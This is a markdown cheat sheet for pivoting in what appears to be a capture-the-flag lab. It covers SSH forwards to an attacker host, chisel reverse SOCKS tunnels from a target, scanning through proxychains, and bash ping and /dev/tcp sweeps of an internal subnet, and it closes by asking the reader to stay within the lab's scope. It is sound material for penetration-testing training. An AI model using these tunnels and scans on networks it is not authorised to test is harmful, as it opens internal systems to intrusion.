# Pivoting and port forwarding

Reach services bound to `127.0.0.1` on the target, or hosts behind it.

## SSH tunnels (when you have SSH access)

```bash
# local forward: target's 127.0.0.1:8080 becomes your 8080
htb x "ssh -i key -L 8080:127.0.0.1:8080 user@$T -N -f"
# dynamic SOCKS proxy — everything through the target
htb x "ssh -i key -D 1080 user@$T -N -f"
# remote forward: expose your listener to a target that cannot reach you directly
ssh -R 4444:127.0.0.1:4444 user@attacker
```

## chisel (no SSH, staged in /opt/static)

```bash
# attacker
htb x "cp /opt/static/chisel_* /engagements/$NAME/www/ && cd /engagements/$NAME/www && python3 -m http.server 8000" &
htb x "/opt/static/chisel_1.10.1_linux_arm64 server -p 9000 --reverse" &
# target
./chisel client LHOST:9000 R:socks          # SOCKS5 on attacker:1080
./chisel client LHOST:9000 R:8080:127.0.0.1:8080   # single port
```

## Using the proxy

```bash
htb x "proxychains4 -q nmap -sT -Pn -n 10.10.20.5"
htb x "proxychains4 -q curl http://10.10.20.5"
```
`/etc/proxychains4.conf` — set `socks5 127.0.0.1 1080`. Note that only TCP
connect scans work through a SOCKS proxy; `-sS` and UDP do not.

## Quick internal discovery from the target

```bash
for i in $(seq 1 254); do (ping -c1 -W1 10.10.20.$i | grep -q ttl && echo 10.10.20.$i &) ; done
# no ping? bash TCP check:
for p in 22 80 445 3389; do (echo > /dev/tcp/10.10.20.5/$p) 2>/dev/null && echo "open $p"; done
```

Keep pivoting scoped to the machine's own lab subnet. Do not scan ranges the
operator did not name.
